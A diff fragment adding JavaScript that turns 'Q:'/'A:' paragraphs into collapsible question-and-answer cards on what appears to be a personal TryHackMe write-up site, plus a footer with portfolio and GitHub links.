+    block.className = 'qa-block';
+
+    /* ── Question ── */
+    const qRow = document.createElement('div');
+    qRow.className = 'qa-question';
+
+    const qBadge = document.createElement('span');
+    qBadge.className = 'qa-q-badge';
+    qBadge.textContent = 'Q';
+    qRow.appendChild(qBadge);
+
+    const qBody = document.createElement('div');
+    qBody.className = 'qa-question-body';
+
+    // First node is the Q: paragraph — strip the prefix, use its innerHTML
+    const qPara = questionNodes[0];
+    qBody.innerHTML = qPara.innerHTML.replace(/^Q:\s*/i, '');
+
+    // Remaining question nodes (walkthrough: images, code, prose)
+    questionNodes.slice(1).forEach(n => qBody.appendChild(n.cloneNode(true)));
+
+    qRow.appendChild(qBody);
+    block.appendChild(qRow);
+
+    /* ── Reveal button ── */
+    const btn = document.createElement('button');
+    btn.className = 'qa-reveal-btn';
+    btn.innerHTML = '<span class="qa-chevron">▼</span><span>reveal answer</span>';
+    block.appendChild(btn);
+
+    /* ── Answer ── */
+    const aPanel = document.createElement('div');
+    aPanel.className = 'qa-answer';
+
+    const aBadge = document.createElement('span');
+    aBadge.className = 'qa-a-badge';
+    aBadge.textContent = 'A';
+    aPanel.appendChild(aBadge);
+
+    const aBody = document.createElement('div');
+    aBody.className = 'qa-answer-body';
+
+    if (answerPara) {
+      // Strip "A:" prefix from the answer paragraph
+      const stripped = answerPara.innerHTML.replace(/^A:\s*/i, '').trim();
+      if (stripped) aBody.innerHTML = stripped;
+      // Trailing images / code
+      answerNodes.forEach(n => aBody.appendChild(n.cloneNode(true)));
+    } else {
+      aBody.innerHTML = '<em style="color:var(--text-dim)">—</em>';
+    }
+
+    aPanel.appendChild(aBody);
+    block.appendChild(aPanel);
+
+    /* ── Toggle ── */
+    btn.addEventListener('click', () => {
+      const isOpen = aPanel.classList.toggle('open');
+      btn.classList.toggle('open', isOpen);
+      btn.querySelector('span:last-child').textContent = isOpen ? 'hide answer' : 'reveal answer';
+    });
+
+    return block;
+  }
+
+  // Work on a snapshot so DOM mutations don't affect iteration
+  let children = Array.from(article.children);
+  let i = 0;
+
+  while (i < children.length) {
+    const el = children[i];
+
+    if (startsWithQ(el)) {
+      const questionNodes = [el]; // first node = Q: paragraph
+      let j = i + 1;
+
+      // Absorb everything until we hit A: or a heading or end
+      while (j < children.length && !startsWithA(children[j]) && !isHeading(children[j])) {
+        // Stop if we hit another Q: (back-to-back questions)
+        if (startsWithQ(children[j])) break;
+        questionNodes.push(children[j]);
+        j++;
+      }
+
+      let answerPara = null;
+      const answerNodes = [];
+
+      if (j < children.length && startsWithA(children[j])) {
+        answerPara = children[j];
+        j++;
+        // Absorb trailing images/code/blockquotes as part of answer
+        while (j < children.length &&
+               !startsWithQ(children[j]) &&
+               !startsWithA(children[j]) &&
+               !isHeading(children[j])) {
+          answerNodes.push(children[j]);
+          j++;
+        }
+      }
+
+      // Build card
+      const card = buildCard(questionNodes, answerPara, answerNodes);
+
+      // Insert before the first consumed node
+      article.insertBefore(card, el);
+
+      // Remove all consumed original nodes
+      [...questionNodes, ...(answerPara ? [answerPara] : []), ...answerNodes]
+        .forEach(n => { if (n.parentNode === article) article.removeChild(n); });
+
+      // Refresh snapshot after DOM mutation
+      children = Array.from(article.children);
+      // Find where the card landed and continue from there
+      i = children.indexOf(card) + 1;
+    } else {
+      i++;
+    }
+  }
+})();
+</script>
+
+<footer class="site-footer">
+  <div class="footer-inner">
+    <span class="footer-text"><span class="prompt">george@kali:~$</span> echo "George Nădejde · TryHackMe Writeups"</span>
+    <div class="footer-links">
+      <a href="https://georgenadejde.github.io" target="_blank" rel="noopener noreferrer">Portfolio</a>
+      <a href="https://github.com/georgenadejde" target="_blank" rel="noopener noreferrer">GitHub</a>
+    </div>
+  </div>
+</footer>
+
+</body>
+</html>
